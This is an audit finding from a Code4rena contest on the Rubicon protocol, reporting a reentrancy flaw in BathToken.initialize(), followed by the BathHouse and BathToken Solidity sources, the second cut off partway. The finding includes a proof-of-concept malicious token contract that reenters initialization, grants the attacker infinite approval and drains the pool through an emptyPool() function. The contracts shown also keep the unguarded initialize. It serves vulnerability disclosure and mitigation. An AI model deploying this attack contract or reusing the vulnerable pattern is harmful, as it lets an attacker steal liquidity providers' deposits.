{
  "Title": "[M-26] Malicious pools can be deployed through BathHouse",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214\n\n\n# Vulnerability details\n\n## Title\nMalicious pools can be deployed through `BathHouse`\n\n## Impact\nReentrancy in `BathToken.initialize()` can be exploited and this allows to create a pool which has a legitimate underlying token (even one for which a pool already exists), and has given full approval of underlying Token to an attacker. While this underlying token will differ from the one returned by  `BathHouse.getBathTokenfromAsset` for that Pool (since the returned token would be the malicious one which reentered `initialize`), the LPs could still deposit actual legitimate tokens to the pool since it is deployed from the BathHouse and has the same name as a legit pool, and loose their deposit to the attacker.\n\n## Proof of Concept\nCreate a new pool calling `BathHouse.openBathTokenSpawnAndSignal()` and passing as `newBathTokenUnderlying` the address with the following malicious token:\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"../../contracts/rubiconPools/BathToken.sol\";\n\ncontract fakeToken is ERC20(\"trueToken\", \"TRUE\"), Ownable {\n\n    ERC20 trueToken;\n    address marketAddress;\n    uint256 counterApprove;\n    BathToken bathToken;\n\n    function setTrueToken(address _trueTokenAddress) onlyOwner {\n        trueToken = ERC20(_trueTokenAddress);\n    }\n\n    function setMarketAddress(address _marketAddress) onlyOwner {\n        marketAddress = _marketAddress;\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        if (counterApprove == 1) { //first approve is from bathHouse\n            bathToken = BathToken(msg.sender);\n            bathToken.initialize(trueToken, owner, owner);\n            attacked = false;\n        }\n        counterApprove++;\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function setAndApproveMarket(address _market){\n        // sets legitimate market after malicious bathToken initialization\n        bathToken.setMarket(_market);\n        bathToken.approveMarket();\n    }\n\n    function emptyPool() onlyOwner {\n        // sends pool tokens to attacker\n        uint256 poolBalance = trueToken.balanceOf(address(bathToken));\n        trueToken.transferFrom(address(bathToken), owner, poolBalance);\n    }\n}\n```\n\nThis reenters `BathToken.initialize()` and reassigns the bathHouse role to the fake token, which names itself as the legit token. Also the reentrant call reassigns the legit Token to `underlyingToken` so thet the pool actually contains the legit token, but gives infinite approval for the legit token from the pool to the attacker, who is passed as `market` in the reentrant call.\n\nSince the fakeToken has the bathHouse role, it can set the market to the actual RubiconMarket after the reentrant call.\n\nCode: [BathHouse.openBathTokenSpawnAndSignal](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153), [BathToken.initialize](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214)\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nAdd `onlyBathHouse` modifier to `initialize` function in `BathToken` to avoid reentrancy from malicious tokens.\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-05-rubicon-contest",
  "Code": [
    {
      "filename": "contracts/rubiconPools/BathHouse.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/// @title  The administrator contract of Rubicon Pools\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice The BathHouse initializes proxy-wrapped bathTokens, manages approved strategists, and sets system variables\n\npragma solidity =0.7.6;\n\nimport \"./BathToken.sol\";\nimport \"../interfaces/IBathPair.sol\";\nimport \"../interfaces/IBathToken.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/proxy/TransparentUpgradeableProxy.sol\";\n\ncontract BathHouse {\n    /// *** Storage Variables ***\n\n    /// @notice Rubicon Bath House\n    string public name;\n\n    /// @notice The administrator of the Bath House contract\n    address public admin;\n\n    /// @notice The proxy administrator of Bath Tokens\n    address public proxyManager;\n\n    /// @notice The core Rubicon Market of the Pools system\n    address public RubiconMarketAddress;\n\n    /// @notice A mapping of approved strategists to access Pools liquidity\n    mapping(address => bool) public approvedStrategists;\n\n    /// @notice The initialization status of BathHouse\n    bool public initialized;\n\n    /// @notice If true, strategists are permissioned and must be approved by admin\n    bool public permissionedStrategists;\n\n    /// @notice Key, system-wide risk parameter for all liquity Pools\n    /// @notice This represents the proportion of a pool's underlying assets that must remain in the pool\n    /// @dev This protects a run on the bank scenario and ensures users can withdraw while allowing funds to be utilized for yield in the market\n    uint256 public reserveRatio;\n\n    /// @notice A variable time delay after which a strategist must return funds to the Bath Token\n    uint256 public timeDelay;\n\n    /// @notice The lone Bath Pair contract of the system which acts as the strategist entry point and logic contract\n    address public approvedPairContract;\n\n    /// @notice The basis point fee that is paid to strategists from LPs on capital that is successfully rebalanced to a Bath Token\n    uint8 public bpsToStrategists;\n\n    /// @notice Key mapping for determining the address of a Bath Token based on its underlying asset\n    /// @dev Source of truth mapping that logs all ERC20 Liquidity pools underlying asset => bathToken Address\n    mapping(address => address) public tokenToBathToken;\n\n    /// @notice The BathToken.sol implementation that any new bathTokens inherit\n    /// @dev The implementation of any ~newly spawned~ proxy-wrapped Bath Tokens via _createBathToken\n    address public newBathTokenImplementation;\n\n    /// *** Events ***\n\n    /// @notice An event that signals the creation of a new Bath Token\n    event LogNewBathToken(\n        address underlyingToken,\n        address bathTokenAddress,\n        address bathTokenFeeAdmin,\n        uint256 timestamp,\n        address bathTokenCreator\n    );\n\n    /// @notice An event that signals the permissionless spawning of a new Bath Token\n    event LogOpenCreationSignal(\n        ERC20 newERC20Underlying,\n        address spawnedBathToken,\n        uint256 initialNewBathTokenDeposit,\n        ERC20 pairedExistingAsset,\n        address pairedExistingBathToken,\n        uint256 pairedBathTokenDeposit,\n        address signaler\n    );\n\n    /// *** Modifiers ***\n\n    /// @notice This modifier enforces that only the admin can call these functions\n    modifier onlyAdmin() {\n        require(msg.sender == admin);\n        _;\n    }\n\n    /// *** External Functions ***\n\n    /// @notice The constructor-like initialization function\n    /// @dev Proxy-safe initialization of storage that sets key storage variables\n    /// @dev Admin is set to msg.sender\n    function initialize(\n        address market,\n        uint256 _reserveRatio,\n        uint256 _timeDelay,\n        address _newBathTokenImplementation,\n        address _proxyAdmin\n    ) external {\n        require(!initialized);\n        name = \"Rubicon Bath House\";\n        admin = msg.sender;\n        timeDelay = _timeDelay;\n\n        // Set Bath Token reserve ratio globally\n        require(_reserveRatio <= 100);\n        require(_reserveRatio > 0);\n        reserveRatio = _reserveRatio;\n\n        // Set BPS reward fee for successful strategist market-making\n        /// @notice [(10000 - {bpsToStrategists}) / 10000] BPS of MM-ing activity is passed to users\n        bpsToStrategists = 20;\n\n        // Set key storage variables\n        RubiconMarketAddress = market;\n        permissionedStrategists = true;\n        newBathTokenImplementation = _newBathTokenImplementation;\n        proxyManager = _proxyAdmin;\n\n        // Automatically approve admin as an approved strategist\n        approveStrategist(admin);\n\n        // Complete contract instantiation\n        initialized = true;\n    }\n\n    /// @notice Permissionless entry point to spawn a Bath Token while posting liquidity to a ~pair of Bath Tokens~\n    /// @notice Please note, creating a Bath Token in this fashion ~does not~ gaurentee markets will be made for the new pair. This function signals the desire to have a new pair supported on Rubicon for strategists to consider market-making for\n    /// @notice The best desiredPairedAsset to select is a popular quote currency. Many traditional systems quote in USD while the ETH quote is superior - the choice is yours sweet msg.sender\n    /// @dev The user must approve the bathHouse to spend their ERC20s\n    /// @dev The user can only spawn a Bath Token for an ERC20 that is not yet in the Pools system and they must post liquidity on the other side of the pair for an ~extant Bath Token~\n    function openBathTokenSpawnAndSignal(\n        ERC20 newBathTokenUnderlying,\n        uint256 initialLiquidityNew, // Must approve this contract to spend\n        ERC20 desiredPairedAsset, // Must be paired with an existing quote for v1\n        uint256 initialLiquidityExistingBathToken\n    ) external returns (address newBathToken) {\n        // Check that it doesn't already exist\n        require(\n            getBathTokenfromAsset(newBathTokenUnderlying) == address(0),\n            \"bathToken already exists for that ERC20\"\n        );\n        require(\n            getBathTokenfromAsset(desiredPairedAsset) != address(0),\n            \"bathToken does not exist for that desiredPairedAsset\"\n        );\n\n        // Spawn a bathToken for the new asset\n        address newOne = _createBathToken(newBathTokenUnderlying, address(0)); // NOTE: address(0) as feeAdmin means fee is paid to pool holders\n\n        // Deposit initial liquidity posted of newBathTokenUnderlying\n        require(\n            newBathTokenUnderlying.transferFrom(\n                msg.sender,\n                address(this),\n                initialLiquidityNew\n            ),\n            \"Couldn't transferFrom your initial liquidity - make sure to approve BathHouse.sol\"\n        );\n\n        newBathTokenUnderlying.approve(newOne, initialLiquidityNew);\n\n        // Deposit assets and send Bath Token shares to msg.sender\n        IBathToken(newOne).deposit(initialLiquidityNew, msg.sender);\n\n        // desiredPairedAsset must be pulled and deposited into bathToken\n        require(\n            desiredPairedAsset.transferFrom(\n                msg.sender,\n                address(this),\n                initialLiquidityExistingBathToken\n            ),\n            \"Couldn't transferFrom your initial liquidity - make sure to approve BathHouse.sol\"\n        );\n        address pairedPool = getBathTokenfromAsset((desiredPairedAsset));\n        desiredPairedAsset.approve(\n            pairedPool,\n            initialLiquidityExistingBathToken\n        );\n\n        // Deposit assets and send Bath Token shares to msg.sender\n        IBathToken(pairedPool).deposit(\n            initialLiquidityExistingBathToken,\n            msg.sender\n        );\n\n        // emit an event describing the new pair, underlyings and bathTokens\n        emit LogOpenCreationSignal(\n            newBathTokenUnderlying,\n            newOne,\n            initialLiquidityNew,\n            desiredPairedAsset,\n            pairedPool,\n            initialLiquidityExistingBathToken,\n            msg.sender\n        );\n\n        newBathToken = newOne;\n    }\n\n    /// ** Admin-Only Functions **\n\n    /// @notice An admin-only function to create a new Bath Token for any ERC20\n    function createBathToken(ERC20 underlyingERC20, address _feeAdmin)\n        external\n        onlyAdmin\n        returns (address newBathTokenAddress)\n    {\n        newBathTokenAddress = _createBathToken(underlyingERC20, _feeAdmin);\n    }\n\n    /// @notice A migration function that allows the admin to write arbitrarily to tokenToBathToken\n    function adminWriteBathToken(ERC20 overwriteERC20, address newBathToken)\n        external\n        onlyAdmin\n    {\n        tokenToBathToken[address(overwriteERC20)] = newBathToken;\n        emit LogNewBathToken(\n            address(overwriteERC20),\n            newBathToken,\n            address(0),\n            block.timestamp,\n            msg.sender\n        );\n    }\n\n    /// @notice Function to initialize and store the address of the ~lone~ bathPair contract for the Rubicon protocol\n    function initBathPair(\n        address _bathPairAddress,\n        uint256 _maxOrderSizeBPS,\n        int128 _shapeCoefNum\n    ) external onlyAdmin returns (address newPair) {\n        require(\n            approvedPairContract == address(0),\n            \"BathPair already approved\"\n        );\n        require(\n            IBathPair(_bathPairAddress).initialized() != true,\n            \"BathPair already initialized\"\n        );\n        newPair = _bathPairAddress;\n\n        IBathPair(newPair).initialize(_maxOrderSizeBPS, _shapeCoefNum);\n\n        approvedPairContract = newPair;\n    }\n\n    /// @notice Admin-only function to set a new Admin\n    function setBathHouseAdmin(address newAdmin) external onlyAdmin {\n        admin = newAdmin;\n    }\n\n    /// @notice Admin-only function to set a new Bath Token implementation\n    /// @dev Please note that all bathTokens created will use this abi\n    function setNewBathTokenImplementation(address newImplementation) external onlyAdmin {\n        newBathTokenImplementation = newImplementation;\n    }\n\n    /// @notice Admin-only function to approve a new permissioned strategist\n    function approveStrategist(address strategist) public onlyAdmin {\n        approvedStrategists[strategist] = true;\n    }\n\n    /// @notice Admin-only function to set whether or not strategists are permissioned\n    function setPermissionedStrategists(bool _new) external onlyAdmin {\n        permissionedStrategists = _new;\n    }\n\n    /// @notice Admin-only function to set timeDelay\n    function setCancelTimeDelay(uint256 value) external onlyAdmin {\n        timeDelay = value;\n    }\n\n    /// @notice Admin-only function to set reserveRatio\n    function setReserveRatio(uint256 rr) external onlyAdmin {\n        require(rr <= 100);\n        require(rr > 0);\n        reserveRatio = rr;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's timeDelay\n    function setBathTokenMarket(address bathToken, address newMarket)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setMarket(newMarket);\n    }\n\n    /// @notice Admin-only function to add a bonus token to a Bath Token's reward schema\n    function setBonusToken(address bathToken, address newBonusToken)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setBonusToken(newBonusToken);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's Bath House admin\n    function setBathTokenBathHouse(address bathToken, address newAdmin)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setBathHouse(newAdmin);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setBathTokenFeeBPS(address bathToken, uint256 newBPS)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeBPS(newBPS);\n    }\n\n    /// @notice Admin-only function to approve the Bath Token's underlying token on the assigned market\n    /// @dev required in case the market address ever changes.. #battleScars\n    function bathTokenApproveSetMarket(address targetBathToken)\n        external\n        onlyAdmin\n    {\n        IBathToken(targetBathToken).approveMarket();\n    }\n\n    /// @notice Admin-only function to set a Bath Token's fee recipient (typically the Bath Token itself)\n    function setBathTokenFeeTo(address bathToken, address feeTo)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeTo(feeTo);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's target Rubicon Market\n    function setMarket(address newMarket) external onlyAdmin {\n        RubiconMarketAddress = newMarket;\n    }\n\n    /// *** View Functions ***\n\n    // Getter Functions for parameters\n    function getMarket() external view returns (address) {\n        return RubiconMarketAddress;\n    }\n\n    function getReserveRatio() external view returns (uint256) {\n        return reserveRatio;\n    }\n\n    function getCancelTimeDelay() external view returns (uint256) {\n        return timeDelay;\n    }\n\n    /// @notice Returns the address of any bathToken in the system based on its corresponding underlying asset\n    function getBathTokenfromAsset(ERC20 asset) public view returns (address) {\n        return tokenToBathToken[address(asset)];\n    }\n\n    function getBPSToStrats() public view returns (uint8) {\n        return bpsToStrategists;\n    }\n\n    /// *** System Security Checks ***\n\n    /// @notice A function to check whether or not an address is an approved strategist\n    function isApprovedStrategist(address wouldBeStrategist)\n        external\n        view\n        returns (bool)\n    {\n        if (\n            approvedStrategists[wouldBeStrategist] == true ||\n            !permissionedStrategists\n        ) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    /// @notice A function to check whether or not an address is the approved system instance of BathPair.sol\n    function isApprovedPair(address pair) public view returns (bool outcome) {\n        pair == approvedPairContract ? outcome = true : outcome = false;\n    }\n\n    /// *** Internal Functions ***\n\n    /// @dev Low-level functionality to spawn a Bath Token using the OZ Transparent Upgradeable Proxy standard\n    /// @param underlyingERC20 The underlying ERC-20 asset that underlies the newBathTokenAddress\n    /// @param _feeAdmin Recipient of pool withdrawal fees, typically the pool itself\n    function _createBathToken(ERC20 underlyingERC20, address _feeAdmin)\n        internal\n        returns (address newBathTokenAddress)\n    {\n        require(initialized, \"BathHouse not initialized\");\n        address _underlyingERC20 = address(underlyingERC20);\n        require(\n            _underlyingERC20 != address(0),\n            \"Cant create bathToken for zero address\"\n        );\n\n        // Check that it isn't already logged in the registry\n        require(\n            tokenToBathToken[_underlyingERC20] == address(0),\n            \"bathToken already exists\"\n        );\n\n        // Creates a new bathToken that is upgradeable by the proxyManager\n        require(\n            newBathTokenImplementation != address(0),\n            \"no implementation set for bathTokens\"\n        );\n\n        // Note, the option of a fee recipient for pool withdrawls exists. For all pools this is set to the pool itself in production and is visible via ~feeTo~ on any respective contract\n        // Note, fee admin presently ignored in the Bath Token initialization() call via defaulting to itself; though, this is still upgradeable by the Bath House admin via\n        bytes memory _initData = abi.encodeWithSignature(\n            \"initialize(address,address,address)\",\n            _underlyingERC20,\n            (RubiconMarketAddress),\n            (_feeAdmin)\n        );\n\n\n            TransparentUpgradeableProxy newBathToken\n         = new TransparentUpgradeableProxy(\n            newBathTokenImplementation,\n            proxyManager,\n            _initData\n        );\n\n        // New Bath Token Address\n        newBathTokenAddress = address(newBathToken);\n\n        // Write to source-of-truth router mapping for this ERC-20 => Bath Token\n        tokenToBathToken[_underlyingERC20] = newBathTokenAddress;\n\n        // Log Data\n        emit LogNewBathToken(\n            _underlyingERC20,\n            newBathTokenAddress,\n            _feeAdmin,\n            block.timestamp,\n            msg.sender\n        );\n    }\n}"
    },
    {
      "filename": "contracts/rubiconPools/BathToken.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice This contract represents a single-asset liquidity pool for Rubicon Pools\n/// @notice Any user can deposit assets into this pool and earn yield from successful strategist market making with their liquidity\n/// @notice This contract looks to both BathPairs and the BathHouse as its admin\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"../interfaces/IBathHouse.sol\";\nimport \"../interfaces/IRubiconMarket.sol\";\nimport \"../interfaces/IBathBuddy.sol\";\n\ncontract BathToken {\n    using SafeMath for uint256;\n\n    /// *** Storage Variables ***\n\n    /// @notice The initialization status of the Bath Token\n    bool public initialized;\n\n    /// @notice  ** ERC-20 **\n    string public symbol;\n    string public name;\n    uint8 public decimals;\n\n    /// @notice The RubiconMarket.sol instance that all pool liquidity is intially directed to as market-making offers\n    address public RubiconMarketAddress;\n\n    /// @notice The Bath House admin of the Bath Token\n    address public bathHouse;\n\n    /// @notice The withdrawal fee recipient, typically the Bath Token itself\n    address public feeTo;\n\n    /// @notice The underlying ERC-20 token which is the core asset of the Bath Token vault\n    IERC20 public underlyingToken;\n\n    /// @notice The basis point fee rate that is paid on withdrawing the underlyingToken and bonusTokens\n    uint256 public feeBPS;\n\n    /// @notice ** ERC-20 **\n    uint256 public totalSupply;\n\n    /// @notice The amount of underlying deposits that are outstanding attempting market-making on the order book for yield\n    /// @dev quantity of underlyingToken that is in the orderbook that the pool still has a claim on\n    /// @dev The underlyingToken is effectively mark-to-marketed when it enters the book and it could be returned at a loss due to poor strategist performance\n    /// @dev outstandingAmount is NOT inclusive of any non-underlyingToken assets sitting on the Bath Tokens that have filled to here and are awaiting rebalancing to the underlyingToken by strategists\n    uint256 public outstandingAmount;\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress ðŸ“ˆ\n    /// @dev Keeping deprecated variables maintains consistent network-agnostic contract abis when moving to new chains and versions\n    uint256[] deprecatedStorageArray; // Kept in to avoid storage collision bathTokens that are proxy upgraded\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress ðŸ“ˆ\n    mapping(uint256 => uint256) deprecatedMapping; // Kept in to avoid storage collision on bathTokens that are upgraded\n    // *******************************************\n\n    /// @notice  ** ERC-20 **\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    /// @notice EIP-2612\n    bytes32 public DOMAIN_SEPARATOR;\n\n    /// @notice EIP-2612\n    /// @dev keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH =\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n    /// @notice EIP-2612\n    mapping(address => uint256) public nonces;\n\n    /// @notice Array of Bonus ERC-20 tokens that are given as liquidity incentives to pool withdrawers\n    address[] public bonusTokens;\n\n    /// @notice Address of the OZ Vesting Wallet which acts as means to vest bonusToken incentives to pool HODLers\n    IBathBuddy public rewardsVestingWallet;\n\n    /// *** Events ***\n\n    /// @notice ** ERC-20 **\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    /// @notice ** ERC-20 **\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Time of Bath Token instantiation\n    event LogInit(uint256 timeOfInit);\n\n    /// @notice Log details about a pool deposit\n    event LogDeposit(\n        uint256 depositedAmt,\n        IERC20 asset,\n        uint256 sharesReceived,\n        address depositor,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool withdraw\n    event LogWithdraw(\n        uint256 amountWithdrawn,\n        IERC20 asset,\n        uint256 sharesWithdrawn,\n        address withdrawer,\n        uint256 fee,\n        address feeTo,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool rebalance\n    event LogRebalance(\n        IERC20 pool_asset,\n        address destination,\n        IERC20 transferAsset,\n        uint256 rebalAmt,\n        uint256 stratReward,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order canceled in the Rubicon Market book\n    event LogPoolCancel(\n        uint256 orderId,\n        IERC20 pool_asset,\n        uint256 outstandingAmountToCancel,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order placed in the Rubicon Market book\n    event LogPoolOffer(\n        uint256 id,\n        IERC20 pool_asset,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log the credit to outstanding amount for funds that have been filled market-making\n    event LogRemoveFilledTradeAmount(\n        IERC20 pool_asset,\n        uint256 fillAmount,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice * EIP 4626 *\n    event Deposit(\n        address indexed caller,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// @notice * EIP 4626 *\n    event Withdraw(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// *** Constructor ***\n\n    /// @notice Proxy-safe initialization of storage; the constructor\n    function initialize(\n        ERC20 token,\n        address market,\n        address _feeTo\n    ) external {\n        require(!initialized);\n        string memory _symbol = string(\n            abi.encodePacked((\"bath\"), token.symbol())\n        );\n        symbol = _symbol;\n        underlyingToken = token;\n        RubiconMarketAddress = market;\n        bathHouse = msg.sender; //NOTE: assumed admin is creator on BathHouse\n\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n        name = string(abi.encodePacked(_symbol, (\" v1\")));\n        decimals = token.decimals(); // v1 Change - 4626 Adherence\n\n        // Add infinite approval of Rubicon Market for this asset\n        IERC20(address(token)).approve(RubiconMarketAddress, 2**256 - 1);\n        emit LogInit(block.timestamp);\n\n        feeTo = address(this); //This contract is the fee recipient, rewarding HODLers\n        feeBPS = 3; //Fee set to 3 BPS initially\n\n        // Complete constract instantiation\n        initialized = true;\n    }\n\n    /// *** Modifiers ***\n\n    modifier onlyPair() {\n        require(\n            IBathHouse(bathHouse).isApprovedPair(msg.sender) == true,\n            \"not an approved pair - bathToken\"\n        );\n        _;\n    }\n\n    modifier onlyBathHouse() {\n        require(\n            msg.sender == bathHouse,\n            \"caller is not bathHouse - BathToken.sol\"\n        );\n        _;\n    }\n\n    /// *** External Functions - Only Bath House / Admin ***\n\n    /// @notice Admin-only function to set a Bath Token's market address\n    function setMarket(address newRubiconMarket) external onlyBathHouse {\n        RubiconMarketAddress = newRubiconMarket;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's Bath House admin\n    function setBathHouse(address newBathHouse) external onlyBathHouse {\n        bathHouse = newBathHouse;\n    }\n\n    /// @notice Admin-only function to approve Bath Token's RubiconMarketAddress with the maximum integer value (infinite approval)\n    function approveMarket() external onlyBathHouse {\n        underlyingToken.approve(RubiconMarketAddress, 2**256 - 1);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setFeeBPS(uint256 _feeBPS) external onlyBathHouse {\n        feeBPS = _feeBPS;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's fee recipient, typically the pool itself\n    function setFeeTo(address _feeTo) external onlyBathHouse {\n        feeTo = _feeTo;\n    }\n\n    /// @notice Admin-only function to add a bonus token to bonusTokens for pool incentives\n    function setBonusToken(address newBonusERC20) external onlyBathHouse {\n        bonusTokens.push(newBonusERC20);\n    }\n\n    /// *** External Functions - Only Approved Bath Pair / Strategist Contract ***\n\n    /// ** Rubicon Market Functions **\n\n    /// @notice The function for a strategist to cancel an outstanding Market Offer\n    function cancel(uint256 id, uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        IRubiconMarket(RubiconMarketAddress).cancel(id);\n\n        emit LogPoolCancel(\n            id,\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice A function called by BathPair to maintain proper accounting of outstandingAmount\n    function removeFilledTradeAmount(uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        emit LogRemoveFilledTradeAmount(\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice The function that places a bid and/or ask in the orderbook for a given pair from this pool\n    function placeOffer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem\n    ) external onlyPair returns (uint256) {\n        // Place an offer in RubiconMarket\n        // If incomplete offer return 0\n        if (\n            pay_amt == 0 ||\n            pay_gem == ERC20(0) ||\n            buy_amt == 0 ||\n            buy_gem == ERC20(0)\n        ) {\n            return 0;\n        }\n\n        uint256 id = IRubiconMarket(RubiconMarketAddress).offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            false\n        );\n        outstandingAmount = outstandingAmount.add(pay_amt);\n\n        emit LogPoolOffer(\n            id,\n            IERC20(underlyingToken),\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        return (id);\n    }\n\n    /// @notice This function returns filled orders to the correct liquidity pool and sends strategist rewards to the Bath Pair\n    /// @dev Sends non-underlyingToken fill elsewhere in the Pools system, typically it's sister asset within a trading pair (e.g. ETH-USDC)\n    /// @dev Strategists presently accrue rewards in the filled asset not underlyingToken\n    function rebalance(\n        address destination,\n        address filledAssetToRebalance, /* sister or fill asset */\n        uint256 stratProportion,\n        uint256 rebalAmt\n    ) external onlyPair {\n        uint256 stratReward = (stratProportion.mul(rebalAmt)).div(10000);\n        IERC20(filledAssetToRebalance).transfer(\n            destination,\n            rebalAmt.sub(stratReward)\n        );\n        IERC20(filledAssetToRebalance).transfer(msg.sender, stratReward);\n\n        emit LogRebalance(\n            IERC20(underlyingToken),\n            destination,\n            IERC20(filledAssetToRebalance),\n            rebalAmt,\n            stratReward,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// *** EIP 4626 Implementation ***\n    // https://eips.ethereum.org/EIPS/eip-4626#specification\n\n    /// @notice Withdraw your bathTokens for the underlyingToken\n    function withdraw(uint256 _shares)\n        external\n        returns (uint256 amountWithdrawn)\n    {\n        return _withdraw(_shares, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function asset() public view returns (address assetTokenAddress) {\n        assetTokenAddress = address(underlyingToken);\n    }\n\n    /// @notice * EIP 4626 *\n    function totalAssets() public view returns (uint256 totalManagedAssets) {\n        return underlyingBalance();\n    }\n\n    /// @notice * EIP 4626 *\n    function convertToShares(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // Note: Inflationary tokens may affect this logic\n        (totalSupply == 0) ? shares = assets : shares = (\n            assets.mul(totalSupply)\n        ).div(totalAssets());\n    }\n\n    // Note: MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n    /// @notice * EIP 4626 *\n    function convertToAssets(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        assets = (totalAssets().mul(shares)).div(totalSupply);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxDeposit(address receiver)\n        public\n        pure\n        returns (uint256 maxAssets)\n    {\n        maxAssets = 2**256 - 1; // No limit on deposits in current implementation  = Max UINT\n    }\n\n    /// @notice * EIP 4626 *\n    function previewDeposit(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // The exact same logic is used, no deposit fee - only difference is deflationary token check (rare condition and probably redundant)\n        shares = convertToShares(assets);\n    }\n\n    // Single asset override to reflect old functionality\n    function deposit(uint256 assets) public returns (uint256 shares) {\n        // Note: msg.sender is the same throughout the same contract context\n        return _deposit(assets, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function deposit(uint256 assets, address receiver)\n        public\n        returns (uint256 shares)\n    {\n        return _deposit(assets, receiver);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxMint(address receiver) public pure returns (uint256 maxShares) {\n        maxShares = 2**256 - 1; // No limit on shares that could be created via deposit in current implementation - Max UINT\n    }\n\n    // Given I want these shares, how much do I have to deposit\n    /// @notice * EIP 4626 *\n    function previewMint(uint256 shares) public view returns (uint256 assets) {\n        (totalSupply == 0) ? assets = shares : assets = (\n            shares.mul(totalAssets())\n        ).div(totalSupply);\n    }\n\n    // Mints exactly shares Vault shares to receiver by depositing amount of underlying tokens.\n    